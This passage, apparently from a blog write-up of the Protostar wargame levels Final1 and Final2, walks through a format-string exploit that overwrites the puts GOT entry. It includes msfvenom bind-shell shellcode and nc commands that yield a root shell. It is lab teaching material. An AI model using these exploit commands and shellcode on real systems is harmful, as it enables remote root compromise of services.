</span><span class='line'>              <span class="n">logit</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">6</span><span class="p">);</span>
</span><span class='line'>              <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">login</span> <span class="n">failed</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>          <span class="p">}</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="n">final1</span><span class="p">]</span> <span class="err">$</span> <span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">getipport</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">l</span><span class="p">;</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">sin</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">l</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">getpeername</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">sin</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">l</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">you</span> <span class="n">don</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="n">t</span> <span class="n">exist</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">sprintf</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">%</span><span class="nl">s</span><span class="p">:</span><span class="o">%</span><span class="n">d</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">inet_ntoa</span><span class="p">(</span><span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">),</span> <span class="n">ntohs</span><span class="p">(</span><span class="n">sin</span><span class="p">.</span><span class="n">sin_port</span><span class="p">));</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">Run</span> <span class="n">the</span> <span class="n">process</span> <span class="n">as</span> <span class="n">a</span> <span class="n">daemon</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
</span><span class='line'>  <span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">Wait</span> <span class="k">for</span> <span class="n">socket</span> <span class="n">activity</span> <span class="n">and</span> <span class="k">return</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">Set</span> <span class="n">the</span> <span class="n">client</span> <span class="n">socket</span> <span class="n">to</span> <span class="n">STDIN</span><span class="p">,</span> <span class="n">STDOUT</span><span class="p">,</span> <span class="n">and</span> <span class="n">STDERR</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
</span><span class='line'>  <span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">getipport</span><span class="p">();</span>
</span><span class='line'>  <span class="n">parser</span><span class="p">();</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>We don&rsquo;t use spaces to find our format string to have more spaces left for
exploit. Also, both <code>username</code> and <code>login</code> parameters are vulnerable, we use
<code>username</code> to store shellcode and <code>login</code> for overwriting <code>GOT entry</code> for
<code>puts()</code>. The line with timestamp is the entry from <code>/var/log/syslog</code> file.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;username &rdquo; + &ldquo;A&rdquo; * 109 + &ldquo;BBBBCCCC&rdquo;  + &ldquo;\nlogin &rdquo; + &ldquo;%p&rdquo; * 70 + &ldquo;\n&rdquo;&rsquo;  | nc 0 2994
</span><span class='line'>[final1] $ [final1] $ [final1] $ login failed
</span><span class='line'>Jun 26 17:24:42 (none) final1: Login from 127.0.0.1:54427 as [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC] with password [0x8049ee40x804a2a00x804a2200xbffff7060xb7fd7ff40xbffff5580x69676f4c0x7266206e0x31206d6f0x302e37320x312e302e0x3434353a0x612037320x415b20730x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x424242420x434343430x6977205d0x702068740x777373610x2064726f0x2570255b0x257025700x257025700x257025700x257025700x257025700x257025700x257025700x257025700x257025700x257025700x257025700x25702570]&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;username &rdquo; + &ldquo;A&rdquo; * 109 + &ldquo;BBBBCCCC&rdquo;  + &ldquo;\nlogin &rdquo; + &ldquo;%p&rdquo; * 43 + &ldquo;\n&rdquo;&rsquo;  | nc 0 2994
</span><span class='line'>[final1] $ [final1] $ [final1] $ login failed
</span><span class='line'>Jun 26 17:26:22 (none) final1: Login from 127.0.0.1:54434 as [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC] with password [0x8049ee40x804a2a00x804a2200xbffff7060xb7fd7ff40xbffff5580x69676f4c0x7266206e0x31206d6f0x302e37320x312e302e0x3434353a0x612034330x415b20730x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x424242420x43434343]&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;username &rdquo; + &ldquo;A&rdquo; * 109 + &ldquo;BBBBCCCC&rdquo;  + &ldquo;\nlogin &rdquo; + &ldquo;%42\$p%43\$p&rdquo; + &ldquo;\n&rdquo;&rsquo;  | nc 0 2994
</span><span class='line'>[final1] $ [final1] $ [final1] $ login failed
</span><span class='line'>Jun 26 17:27:21 (none) final1: Login from 127.0.0.1:54435 as [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC] with password [0x424242420x43434343]</span></code></pre></td></tr></table></div></figure></p>

<p>We have 109 bytes for shellcode, not much but it should be sufficient.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@protostar:/tmp# objdump -t /opt/protostar/bin/final1  | grep username
</span><span class='line'>0804a220 g     O .bss   00000080              username&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:/tmp$ objdump -TR /opt/protostar/bin/final1 | grep puts
</span><span class='line'>00000000      DF &lt;em>UND&lt;/em>  00000000  GLIBC_2.0   puts
</span><span class='line'>0804a194 R_386_JUMP_SLOT   puts</span></code></pre></td></tr></table></div></figure></p>

<p>In order to pass this challenge, we need to store the address <code>0x0804a220</code> to
<code>0x0804a194</code>. Our <code>formatter.rb</code> is the same script as in the <code>protostar format</code>
challenges.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/tmp$ ruby1.9.1 ./formatter.rb 42:0x0804a194:0x0804a220
</span><span class='line'>ruby -e &lsquo;print [0x0804a196].pack(&ldquo;V&rdquo;) + [0x0804a194].pack(&ldquo;V&rdquo;) + &ldquo;%42\$2044x%42\$hn%43\$39452x%43\$hn&rdquo;&rsquo;</span></code></pre></td></tr></table></div></figure></p>

<p>Exploitation process:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>window1:&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>root@protostar:/tmp# gdb -q -ex &lsquo;set detach-on-fork off&rsquo; -ex &lsquo;set follow-fork-mode child&rsquo; -ex &lsquo;set disassembly-flavor intel&rsquo; -ex &lsquo;run&rsquo; /opt/protostar/bin/final1
</span><span class='line'>Reading symbols from /opt/protostar/bin/final1&hellip;done.
</span><span class='line'>Starting program: /opt/protostar/bin/final1
</span><span class='line'>[New process 29349]
</span><span class='line'>[New process 29352]&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>window2:&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;username &rdquo; + &ldquo;A&rdquo; * 109 + [0x0804a196].pack(&ldquo;V&rdquo;) + [0x0804a194].pack(&ldquo;V&rdquo;)  + &ldquo;\nlogin &rdquo; + &ldquo;%42\$2044x%42\$hn%43\$39452x%43\$hn&rdquo; + &ldquo;\n&rdquo;&rsquo;  | nc 0 2994
</span><span class='line'>[final1] $ [final1] $ [final1] $ ^C&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>window1:&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>[Switching to process 29352]
</span><span class='line'>0x08a1a2bd in ?? ()&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(gdb) x /x 0x0804a194
</span><span class='line'>0x804a194 &lt;&lt;em>GLOBAL_OFFSET_TABLE&lt;/em>+168>:  0x08a1a2bd</span></code></pre></td></tr></table></div></figure></p>

<p>So, we have <code>0x08a1a2bd</code> instead of <code>0x0804a220</code>, let&rsquo;s see the difference:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0x08a1-0x0804 = 157
</span><span class='line'>0xa2bd-0xa220 = 157</span></code></pre></td></tr></table></div></figure></p>

<p>Substracting <code>157</code> from <code>2044</code>, we got <code>1887</code> and that is the correct value, which we will use. Another try:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>window1:&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>root@protostar:/tmp# gdb -q -ex &lsquo;set detach-on-fork off&rsquo; -ex &lsquo;set follow-fork-mode child&rsquo; -ex &lsquo;set disassembly-flavor intel&rsquo; -ex &lsquo;run&rsquo; /opt/protostar/bin/final1
</span><span class='line'>Reading symbols from /opt/protostar/bin/final1&hellip;done.
</span><span class='line'>Starting program: /opt/protostar/bin/final1
</span><span class='line'>[New process 29370]
</span><span class='line'>[New process 29373]&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>window2:&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;username &rdquo; + &ldquo;A&rdquo; * 109 + [0x0804a196].pack(&ldquo;V&rdquo;) + [0x0804a194].pack(&ldquo;V&rdquo;)  + &ldquo;\nlogin &rdquo; + &ldquo;%42\$1887x%42\$hn%43\$39452x%43\$hn&rdquo; + &ldquo;\n&rdquo;&rsquo;  | nc 0 2994
</span><span class='line'>[final1] $ [final1] $ [final1] $ ^C&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>window1:&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>[Switching to process 29373]
</span><span class='line'>0x0804a28e in username ()
</span><span class='line'>(gdb) x /x 0x0804a194
</span><span class='line'>0x804a194 &lt;&lt;em>GLOBAL_OFFSET_TABLE&lt;/em>+168>:  0x0804a220</span></code></pre></td></tr></table></div></figure></p>

<p>That&rsquo;s correct, now we need to generate payload not longer than 109 bytes:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# /usr/share/metasploit-framework/tools/payload_lengths.rb | awk &lsquo; $2&lt;=100&rsquo; | grep &lsquo;linux/x86&rsquo;
</span><span class='line'>    linux/x86/adduser                                   97
</span><span class='line'>    linux/x86/chmod                                     36
</span><span class='line'>    linux/x86/exec                                      36
</span><span class='line'>    linux/x86/meterpreter/bind_ipv6_tcp                 85
</span><span class='line'>    linux/x86/meterpreter/bind_nonx_tcp                 63
</span><span class='line'>    linux/x86/meterpreter/find_tag                      37
</span><span class='line'>    linux/x86/meterpreter/reverse_ipv6_tcp              77
</span><span class='line'>    linux/x86/meterpreter/reverse_nonx_tcp              50
</span><span class='line'>    linux/x86/read_file                                 62
</span><span class='line'>    linux/x86/shell/bind_ipv6_tcp                       85
</span><span class='line'>    linux/x86/shell/bind_nonx_tcp                       63
</span><span class='line'>    linux/x86/shell/find_tag                            37
</span><span class='line'>    linux/x86/shell/reverse_ipv6_tcp                    77
</span><span class='line'>    linux/x86/shell/reverse_nonx_tcp                    50
</span><span class='line'>    linux/x86/shell_bind_ipv6_tcp                       90
</span><span class='line'>    linux/x86/shell_bind_tcp                            78
</span><span class='line'>    linux/x86/shell_bind_tcp_random_port                57
</span><span class='line'>    linux/x86/shell_find_port                           62
</span><span class='line'>    linux/x86/shell_find_tag                            69
</span><span class='line'>    linux/x86/shell_reverse_tcp                         68</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/shell_bind_tcp LPORT=2450 -b &lsquo;\x0a\x0d\x00&rsquo; -f sh
</span><span class='line'>No platform was selected, choosing Msf::Module::Platform::Linux from the payload
</span><span class='line'>No Arch selected, selecting Arch: x86 from the payload
</span><span class='line'>Found 22 compatible encoders
</span><span class='line'>Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
</span><span class='line'>x86/shikata_ga_nai succeeded with size 105 (iteration=0)
</span><span class='line'>Payload size: 105 bytes
</span><span class='line'>export buf=\
</span><span class='line'>$&lsquo;\xda\xd9\xbd\xfe\xa6\x57\x8e\xd9\x74\x24\xf4\x5a\x31\xc9&rsquo;\
</span><span class='line'>$&lsquo;\xb1\x14\x83\xc2\x04\x31\x6a\x15\x03\x6a\x15\x1c\x53\x66&rsquo;\
</span><span class='line'>$&lsquo;\x55\x17\x7f\xda\x2a\x84\xea\xdf\x25\xcb\x5b\xb9\xf8\x8b&rsquo;\
</span><span class='line'>$&lsquo;\xc7\x18\x51\xe3\xf5\xa4\x5c\x61\x93\xb4\x0f\xd5\xed\x54&rsquo;\
</span><span class='line'>$&lsquo;\xc5\xb3\xb5\x5b\x9a\xb2\x07\x60\x28\xc0\x37\x0e\x83\x48&rsquo;\
</span><span class='line'>$&lsquo;\x74\x7f\x7d\x85\xfb\xec\xdb\x7f\xc3\x4a\x11\xff\x72\x12&rsquo;\
</span><span class='line'>$&lsquo;\x51\x97\xab\xcb\xd2\x0f\xdc\x3c\x77\xa6\x72\xca\x94\x68&rsquo;\
</span><span class='line'>$&lsquo;\xd8\x45\xbb\x38\xd5\x98\xbc&rsquo;</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/tmp$ export buf=\&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;blockquote>&lt;p>$&lsquo;\xda\xd9\xbd\xfe\xa6\x57\x8e\xd9\x74\x24\xf4\x5a\x31\xc9&rsquo;\
</span><span class='line'>$&lsquo;\xb1\x14\x83\xc2\x04\x31\x6a\x15\x03\x6a\x15\x1c\x53\x66&rsquo;\
</span><span class='line'>$&lsquo;\x55\x17\x7f\xda\x2a\x84\xea\xdf\x25\xcb\x5b\xb9\xf8\x8b&rsquo;\
</span><span class='line'>$&lsquo;\xc7\x18\x51\xe3\xf5\xa4\x5c\x61\x93\xb4\x0f\xd5\xed\x54&rsquo;\
</span><span class='line'>$&lsquo;\xc5\xb3\xb5\x5b\x9a\xb2\x07\x60\x28\xc0\x37\x0e\x83\x48&rsquo;\
</span><span class='line'>$&lsquo;\x74\x7f\x7d\x85\xfb\xec\xdb\x7f\xc3\x4a\x11\xff\x72\x12&rsquo;\
</span><span class='line'>$&lsquo;\x51\x97\xab\xcb\xd2\x0f\xdc\x3c\x77\xa6\x72\xca\x94\x68&rsquo;\
</span><span class='line'>$&lsquo;\xd8\x45\xbb\x38\xd5\x98\xbc&rsquo;&lt;/p>&lt;/blockquote>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;username &rdquo; + ENV[&ldquo;buf&rdquo;] + &ldquo;A&rdquo; * (109-105) + [0x0804a196].pack(&ldquo;V&rdquo;) + [0x0804a194].pack(&ldquo;V&rdquo;)  + &ldquo;\nlogin &rdquo; + &ldquo;%42\$1887x%42\$hn%43\$39452x%43\$hn&rdquo; + &ldquo;\n&rdquo;&rsquo;  | nc 0 2994
</span><span class='line'>[final1] $ [final1] $ [final1] $ ^C
</span><span class='line'>user@protostar:/tmp$ nc 0 2450
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)</span></code></pre></td></tr></table></div></figure></p>

<h2>Protostar Final2</h2>

<p><figure class='code'><figcaption><span>final2.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;..</span><span class="o">/</span><span class="n">common</span><span class="o">/</span><span class="n">common</span><span class="p">.</span><span class="n">c</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;..</span><span class="o">/</span><span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">NAME</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">final2</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">UID</span> <span class="mi">0</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">GID</span> <span class="mi">0</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">PORT</span> <span class="mi">2993</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">REQSZ</span> <span class="mi">128</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">check_path</span><span class="p">(</span><span class="kt">char</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">buf</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">start</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
